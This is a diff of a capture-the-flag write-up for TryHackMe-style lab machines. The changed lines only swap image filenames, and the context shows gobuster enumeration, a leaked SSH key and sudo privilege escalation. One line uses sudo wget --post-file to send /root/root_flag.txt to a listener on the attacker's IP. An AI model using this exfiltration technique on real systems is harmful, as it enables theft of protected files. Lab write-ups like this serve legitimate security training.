@@ -139,11 +139,11 @@ Host script results:
 
 Then we can start to see website (port 80):
 
-<figure><img src="../.gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>
 
 and see page source for checking information disclosure.
 
-<figure><img src="../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>
 
 but we don't find precious info.
 
@@ -153,19 +153,19 @@ Another good thing to do, is find hidden paths on website using gobuster
 gobuster dir -u blog.thm -w /usr/share/wordlists/dirb/common.txt
 ```
 
-<figure><img src="../.gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>
 
 Very good, we can start to check these web dir:
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (153).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
 we just know that wp-admin is a default login path for wordpress, then we go there:
 
-<figure><img src="../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>
 
 we can try to login with admin/billy/kare:password (that are present on blog page how authors), but it doesn't works.
 
@@ -280,11 +280,11 @@ Interesting Finding(s):
 gobuster dir -u wgel.thm/sitemap -w /usr/share/wordlists/dirb/common.txt  
 ```
 
-<figure><img src="../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>
 
 we've find and id\_rsa:
 
-<figure><img src="../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>
 
 remembering that we've user and id rsa, first take permission to id\_rsa file and try login:
 
@@ -306,7 +306,7 @@ We're in, try to find user.txt flag using find command:\
 find / -type f -iname "*flag.txt" 2>/dev/null
 ```
 
-<figure><img src="../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>
 
 <details>
 
@@ -330,17 +330,17 @@ We can do sudo -l command to discover user's permissions.
 
 
 
-<figure><img src="../.gitbook/assets/image (148).png" alt=""><figcaption><p>find IP and listen on port 4444</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (162).png" alt=""><figcaption><p>find IP and listen on port 4444</p></figcaption></figure>
 
 ```bash
 sudo /usr/bin/wget http://10.9.80.228:4444 --post-file=/root/root_flag.txt
 ```
 
-<figure><img src="../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
